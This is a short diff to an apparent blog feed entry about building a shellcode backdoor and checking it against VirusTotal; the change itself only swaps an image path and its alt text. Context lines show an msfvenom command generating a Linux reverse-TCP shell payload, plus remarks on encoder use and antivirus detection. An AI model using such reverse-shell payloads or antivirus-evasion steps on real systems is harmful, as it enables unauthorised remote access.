@@ -103,7 +103,7 @@ To run the Shellcode you have todo the same as before, just copy the output, pas
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/shell/reverse_tcp LHOST=127.0.0.1 LPORT=8089 -b &quot;\x00&quot; -f c -o raw.txt 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;For some reason msfvenom used shikata_ga_nai, but i didnt specify to use it which was really suprising for me. If we now upload the backdoor to VirusTotal it will be detected.
-&lt;img src=&quot;.images/vtotal01.png&quot; alt=&quot;Virus Total Screenshot here&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;images/crp.png&quot; alt=&quot;Drag Racing&quot; /&gt;&lt;/p&gt;
 
 </description>
         <pubDate>Sun, 18 Sep 2022 00:00:00 +0200</pubDate>
